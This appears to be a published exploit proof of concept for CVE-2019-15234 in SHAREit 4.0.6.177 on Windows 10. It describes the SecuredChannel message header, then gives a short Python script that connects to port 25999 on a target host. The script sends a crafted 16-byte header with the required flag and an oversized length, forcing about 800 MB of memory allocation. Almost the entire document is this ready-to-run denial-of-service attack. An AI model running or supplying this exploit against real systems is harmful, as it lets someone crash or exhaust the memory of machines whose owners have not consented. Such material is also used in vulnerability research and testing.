# Exploit Title: SHAREIt Uncontrolled Memory Allocation - SecuredChannel
# Date: 04/19/20
# Exploit Author: Nathu Nandwani
# Version: 4.0.6.177
# Tested on: Windows 10 x64
# CVE: CVE-2019-15234

#SecureChannel
#-Receive 16 bytes
#> 4 bytes (uint) = Flag
#> 4 bytes (int) = FullMessageLength
#> 4 bytes (int) = MessageType
#> 4 bytes (uint) = Reserved
# Conditions:
# Flag has to be 4261346814U
# FullMessageLength > 16

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.111", 25999))
# Allocate ~800 MB of memory (0x2FFFFFFF)
s.send("\xFE\xFD\xFE\xFD\xFF\xFF\xFF\x2F\x01\x01\x01\x01\x01\x01\x01\x01")
s.close()